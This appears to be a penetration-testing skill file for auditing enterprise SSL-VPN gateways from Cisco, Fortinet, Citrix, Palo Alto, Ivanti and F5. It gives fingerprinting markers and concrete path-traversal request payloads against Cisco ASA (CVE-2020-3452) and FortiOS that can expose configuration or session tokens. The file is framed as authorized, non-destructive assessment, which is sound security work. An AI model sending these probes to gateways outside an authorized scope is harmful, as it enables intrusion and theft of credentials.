---
name: perimeter-vpn-gateway-audit
description: Enterprise SSL-VPN and Remote Access Gateway assessment — Cisco ASA/AnyConnect, Fortinet FortiOS, Citrix NetScaler/ADC, Palo Alto GlobalProtect, and Ivanti/Pulse Secure perimeter checks.
---

# Enterprise SSL-VPN & Remote Access Gateway Auditing

## 1. Prerequisites & Input Contract
- **Authorization Scope:** Verified perimeter gateway IP addresses, hostnames (`vpn.*`, `remote.*`, `connect.*`), and SSL-VPN ports (443, 8443, 10443) in `scope.yaml`.
- **Target Context:** Internet-facing enterprise VPN appliances.
- **Traffic Routing:** Route HTTP/TLS probes and path verification requests through Caido proxy.

---

## 2. Core Attack Heuristics & Step-by-Step Flow

### Step 1: Perimeter Appliance Fingerprinting & Cookie Identification
Inspect TLS certificates, headers, cookies, and distinctive portal paths:
- **Cisco ASA / AnyConnect:** `Set-Cookie: webvpn=`, path `/+CSCOE+/logon.html`, `/+CSCOE+/saml/sp/metadata`
- **Fortinet FortiOS:** `Set-Cookie: SVPNCOOKIE=`, path `/remote/login`, `/remote/info`
- **Citrix NetScaler / ADC:** `Set-Cookie: NSC_AAA=`, `Server: NetScaler`, path `/vpn/index.html`
- **Palo Alto GlobalProtect:** `Set-Cookie: PHPSESSID=`, path `/global-protect/login.esp`
- **Ivanti / Pulse Secure:** `Set-Cookie: DSAuthSession=`, `DSPREAUTH=`, path `/dana-na/auth/url_default/welcome.cgi`
- **F5 BIG-IP APM:** `Set-Cookie: BIGipServer*`, `MRHSession=`, path `/my.policy`

### Step 2: Configuration & Path Traversal Disclosure Probes
Test safe, non-destructive path traversal probes:
```bash
# Cisco ASA / AnyConnect (CVE-2020-3452 / CVE-2018-0296)
GET /+CSCOE+/files/file_name.html?Filename=Microsoft.Manifest+/+CSCOT+/lua/test.lua HTTP/1.1
Host: {{ target }}

GET /+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua HTTP/1.1
Host: {{ target }}
```

### Step 3: SAML / AAA Backend & Session Boundary Verification
1. Check if SAML authentication is enabled: `GET /+CSCOE+/saml/sp/metadata`.
2. Observe if pre-authentication portals disclose internal Active Directory domain names, Kerberos realms, or internal server names.

---

## 3. Empirical Disclosed Report Patterns & High-Risk Matrices

| Appliance Type | Mechanism | Empirical Disclosed Pattern | Expected Evidence Marker |
|---|---|---|---|
| **Cisco ASA Path Traversal** | Unsanitized `Filename` parameter in Lua handler | `GET /+CSCOE+/files/file_name.html?Filename=...` | Portal inclusion Lua script or configuration disclosure |
| **Citrix Gateway Info Leak** | Unauthenticated `/vpn/index.html` header leak | Check NetScaler build banner in HTML comments | Exact build and firmware revision |
| **Palo Alto GlobalProtect Portal** | Unrestricted access to `/global-protect/portal/` | Request portal configuration XML without session | Internal gateway list and authentication profile names |
| **FortiOS VPN Config Leak** | Pre-auth directory traversal on legacy versions | Probe `/remote/fgt_lang?lang=/../../../..` | Binary configuration strings or session tokens |

---

## 4. Evidence Collection & Validation Gate
1. **Self-Contained Proof:** Capture HTTP request and response showing disclosed version strings, portal configurations, or safe file reads.
2. **Impact Proof:** Verify exposure without attempting disruptive exploits or credential brute-forcing against live operational VPN gateways.
3. **Remediation:** Apply vendor security updates, restrict management interfaces from public internet exposure, and enforce multi-factor authentication (MFA) on all remote-access profiles.
